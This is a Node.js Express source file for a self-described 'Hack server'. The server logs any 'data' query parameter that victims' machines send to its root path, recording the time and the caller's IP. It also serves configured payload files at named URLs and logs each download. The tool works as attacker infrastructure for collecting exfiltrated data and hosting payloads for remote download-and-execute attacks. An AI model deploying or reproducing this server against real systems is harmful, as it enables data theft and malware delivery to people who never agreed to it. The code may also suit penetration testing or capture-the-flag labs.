const express = require('express')
const yargs = require('yargs')

const getPayloadObject = require('./payload')
const getNetworkInfo = require('./getNetworkInfo')

const getUrl = (networkInfo, networkInterface, port) => {
  return `http://${networkInfo[networkInterface].inet}:${port}`
}

const networkInfo = getNetworkInfo()

const { port, networkInterface, payload } = yargs(process.argv.slice(2))
  .option('networkInterface', {
    alias: 'n',
    type: 'string',
    description: 'The network interface to use',
    required: true,
    choices: Object.keys(networkInfo)
  })
  .option('port', {
    alias: 'p',
    type: 'number',
    description: 'Port to run the server in',
    default: 3000
  })
  .option('payload', {
    alias: 'l',
    description: 'Payload file (array, object or string) to serve'
  })
  .parse()

const payloadObj = getPayloadObject(payload)

const app = express()

app.use(express.json())
app.use(express.urlencoded({ extended: true }))

app.all('/', (req, res) => {
  const data = req.query.data && decodeURI(req.query.data)
  console.log(`\n${new Date().toLocaleString()} – ${req.method} - ${req.ip}`)
  console.log(data || "No 'data' query parameter given")
  res.send(200)
})

if (payloadObj) {
  Object.entries(payloadObj).forEach(([key, value]) => {
    app.get(`/${key}`, (req, res) => {
      console.log(`\n${new Date().toLocaleString()} – ${req.method} - ${req.ip}`)
      console.log(`${value} downloaded, url: ${req.url}`)
      res.sendFile(value)
    })
  })
}

app.listen(port, async() => {
  const url = getUrl(networkInfo, networkInterface, port)

  console.log(`Hack server started on port ${port} 😈`)
  console.log(`Available in ${networkInterface} interface in ${url}`)
  if (payloadObj) {
    console.log(`Payloads: ${Object.entries(payloadObj).map(([key, value]) => (
      `\n\t${url}/${key}\t–\t${value}`
    )).join('')}`)
  }
})
